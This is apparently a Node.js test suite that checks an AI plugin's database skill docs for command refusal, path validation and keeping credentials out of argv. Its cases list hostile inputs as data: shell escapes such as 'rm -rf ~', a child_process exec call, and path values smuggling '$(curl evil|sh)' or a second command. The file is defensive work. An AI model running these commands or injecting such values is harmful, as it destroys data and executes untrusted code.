'use strict'

const assert = require('node:assert/strict')
const fs = require('node:fs')
const path = require('node:path')
const { describe, it } = require('node:test')

const root = path.join(__dirname, '..')
const read = (skill) => fs.readFileSync(path.join(root, 'skills', skill, 'SKILL.md'), 'utf8')
const queryDb = read('query-db')
const analyzeDb = read('analyze-db')
const mcp = JSON.parse(fs.readFileSync(path.join(root, '.mcp.json'), 'utf8')).mcpServers

const codeSpans = (text) => [...text.matchAll(/`([^`]+)`/g)].map((m) => m[1])
const blocking = queryDb.split('### Write Operation Blocking\n')[1].split('\n### ')[0]
const metaClause = blocking.split('\n').find((l) => l.startsWith('**Client meta-commands'))
const analyzeRule = analyzeDb.split('\n').find((l) => l.startsWith('- **No client meta-commands**'))

const isRefused = (clause, line) => {
  const spans = codeSpans(clause)
  const trimmed = line.trimStart()
  const lower = trimmed.toLowerCase()
  if (trimmed.startsWith('\\') || trimmed.startsWith('.')) return spans.includes('\\') || spans.includes('.')
  if (['system', 'source'].some((w) => lower === w || lower.startsWith(`${w} `))) return spans.includes(lower.split(' ')[0])
  return ['require(', 'load(', 'process.'].some((call) => spans.includes(call) && trimmed.includes(call))
}

describe('client meta-command refusal', () => {
  for (const [skill, clause] of [['query-db', metaClause], ['analyze-db', analyzeRule]]) {
    it(`${skill} states the rule`, () => {
      assert.ok(clause, `${skill} has no client meta-command rule`)
    })

    const cases = [
      ['\\! rm -rf ~', true],
      ["  \\copy orders TO '/tmp/orders.csv'", true],
      ['.shell id', true],
      ['.output /tmp/dump.txt', true],
      ['system id', true],
      ['source /tmp/evil.sql', true],
      ["require('child_process').execSync('id')", true],
      ['SELECT 1;', false],
      ['db.orders.find({})', false],
      ['SELECT system_id FROM hosts', false]
    ]
    for (const [line, refused] of cases) {
      it(`${skill} ${refused ? 'refuses' : 'allows'} ${JSON.stringify(line)}`, () => {
        assert.equal(isRefused(clause, line), refused)
      })
    }
  }

  it('query-db refuses meta-commands even after confirmation', () => {
    assert.match(metaClause, /never run, even after confirmation/)
  })

  it('query-db no longer documents sqlite dot-commands as tips', () => {
    assert.doesNotMatch(queryDb, /^- `\.(tables|schema)/m)
  })
})

describe('query-db exfiltration guard', () => {
  it('pre-approves no curl', () => {
    const allowed = queryDb.split('\n').find((l) => l.startsWith('allowed-tools:'))
    assert.doesNotMatch(allowed, /curl/)
  })

  it('tells the model to target only $ES_URL', () => {
    assert.match(queryDb, /only ever target `\$ES_URL`/)
  })
})

describe('DBHub credentials', () => {
  for (const name of ['postgres', 'mysql']) {
    it(`${name} receives its DSN through the environment, not argv`, () => {
      const server = mcp[name]
      assert.ok(!server.args.includes('--dsn'), `${name} still passes --dsn`)
      assert.ok(!server.args.some((a) => a.includes('PASS')), `${name} has a password in argv`)
      assert.match(server.env.DSN, /^(postgres|mysql):\/\/\$\{/)
    })
  }
})

describe('database write access is governed by AWS permissions', () => {
  const arch = fs.readFileSync(path.join(root, 'docs', 'architecture.md'), 'utf8')

  it('docs/architecture.md documents the decision', () => {
    assert.match(arch, /### Database read\/write authorization \(AWS account permissions, outside the plugin\)/)
  })

  it('bundled database servers are not forced read-only', () => {
    assert.ok(!mcp.mongodb.args.includes('--readOnly'))
    for (const name of ['postgres', 'mysql']) assert.ok(!mcp[name].args.includes('--config'))
  })
})

describe('analyze-db DB_DOC path charset check', () => {
  const location = analyzeDb.split('## Schema Document Location\n')[1].split('\n## ')[0]
  const pattern = codeSpans(location).find((s) => s.startsWith('^[') && s.endsWith('$'))
  const mkdirLine = analyzeDb.split('\n').find((l) => l.startsWith('Create the document\'s parent directory'))

  it('states an anchored allow-list for DB_DOC and stops on a mismatch', () => {
    assert.ok(pattern, 'no DB_DOC charset pattern')
    assert.match(location, /and stop\./)
  })

  const cases = [
    ['~/src/api/docs/db.md', true],
    ['/Users/u/shared/db-docs/db.md', true],
    ['../api/docs/db_v2.md', true],
    ['~/x/$(curl evil|sh)/db.md', false],
    ['~/x/`id`/db.md', false],
    ['docs/db.md"; rm -rf ~; "', false],
    ['docs/my db.md', false],
    ['docs/db.md\nid', false]
  ]
  for (const [value, accepted] of cases) {
    it(`${accepted ? 'accepts' : 'rejects'} ${JSON.stringify(value)}`, () => {
      assert.ok(pattern, 'no DB_DOC charset pattern')
      assert.equal(new RegExp(pattern).test(value), accepted)
    })
  }

  it('builds the mkdir argument only from a checked value', () => {
    assert.doesNotMatch(mkdirLine, /written literally/)
    assert.match(mkdirLine, /passed the character check/)
  })
})
